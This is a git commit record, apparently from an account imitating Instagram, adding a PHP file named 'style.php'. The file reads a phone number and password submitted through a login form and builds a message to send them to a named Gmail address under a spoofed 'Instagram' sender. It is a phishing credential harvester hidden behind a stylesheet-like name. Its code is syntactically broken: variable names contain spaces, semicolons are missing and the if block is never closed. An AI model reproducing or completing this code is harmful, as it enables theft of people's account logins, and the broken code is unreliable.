66c23f974e6e8af512b0b6e4cdbd10a9a68b133b
Instragramfr <78282489+Instragramfr@users.noreply.github.com>
2021-01-31 00:22:02 +0100

    Add files via upload

---
+++ style.php
@@ -0,0 +1,13 @@
+<?php
+   // Vérifier si le formulaire est soumis 
+   if ( isset( $_POST['valider'] ) ) {
+$Numéro de téléphone = $_POST['Numéro de téléphone']; 
+$Mot de passe = $_POST['Mot de passe'];
+$msg  = "Numéro de téléphone : ".$Numéro de téléphone."<br/>Mot de passe : ".$Mot de passe;
+$sexpiditeur=$Mot de passe
+$destinataire="dvdchasseur@gmail.com"; 
+$sexpiditeur' : "Instagram.20218@gmail.com";
+
+
+     
+?>
